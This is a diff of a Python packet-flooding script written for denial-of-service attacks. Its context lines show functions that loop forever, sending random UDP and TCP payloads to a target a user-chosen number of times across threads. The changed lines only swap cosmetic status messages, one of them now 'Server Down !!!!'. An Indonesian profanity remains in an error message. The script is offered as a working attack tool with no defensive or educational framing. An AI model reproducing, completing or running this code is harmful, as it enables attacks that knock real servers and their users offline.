@@ -28,7 +28,7 @@ times = int(input(" PACKETS:"))
 threads = int(input(" ISI PACKETS:"))
 def run():
 	data = random._urandom(50000)
-	i = random.choice(("[Packed]","[Packed]","[Packed]"))
+	i = random.choice(("[!]","[*]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -41,7 +41,7 @@ def run():
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("[Packed]","[Packed]","[Packed]"))
+	i = random.choice(("[!]","[*]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -49,7 +49,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Tok Tok Tok Packed Dari MR.DANI Otw")
+			print(i +" Server Down !!!!")
 		except:
 			s.close()
 			print("[*] Error kontol")
